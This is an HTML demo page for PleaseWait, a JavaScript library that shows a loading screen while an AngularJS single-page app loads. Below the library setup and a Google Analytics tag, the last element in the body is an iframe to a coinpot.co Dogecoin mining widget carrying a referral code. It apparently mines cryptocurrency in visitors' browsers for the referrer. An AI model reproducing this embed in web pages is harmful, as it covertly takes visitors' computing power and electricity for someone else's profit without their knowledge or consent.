<!DOCTYPE html>
<html ng-app="AngularApp">
<head>
	<meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="PleaseWait is a small Javascript library that shows a beautiful loading page for your SPA while it loads.">
    <meta name="keywords" content="pleasewait, loading, spa, indicator, javascript, css, pathgather, css3, github, html5">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link href="assets/favicon.ico?v=5" rel="shortcut icon" type="image/vnd.microsoft.icon">
    <link href="assets/css/please-wait.css" rel="stylesheet">
    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/default.css" rel="stylesheet">
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
    <title>Please Wait Loading</title>
  </head>
  <body ng-controller="MainCtrl">
    <div class="inner" ng-view>
    </div>
    <script type="text/javascript" src="assets/js/please-wait.min.js"></script>
    <script type="text/javascript">
      window.loading_screen = window.pleaseWait({
        logo: "assets/images/wait.png",
        backgroundColor: '#f4983b',
        loadingHtml: "<p class='loading-message'>Loading, Please Wait.</p><div class='sk-spinner sk-spinner-wave'><div class='sk-rect1'></div><div class='sk-rect2'></div><div class='sk-rect3'></div><div class='sk-rect4'></div><div class='sk-rect5'></div></div>"
      });
    </script>
    <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.3.5/angular.min.js"></script>
    <script src="assets/js/default.js"></script>
	<!-- Global site tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-88572806-1"></script>
	<script>
	  window.dataLayer = window.dataLayer || [];
	  function gtag(){dataLayer.push(arguments);}
	  gtag('js', new Date());

	  gtag('config', 'UA-88572806-1');
	</script>
  <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/dogecoin/?ref=842BC64C691E&mode=widget" style="overflow:hidden;width:324px;height:470px;"></iframe>
</body>
</html>
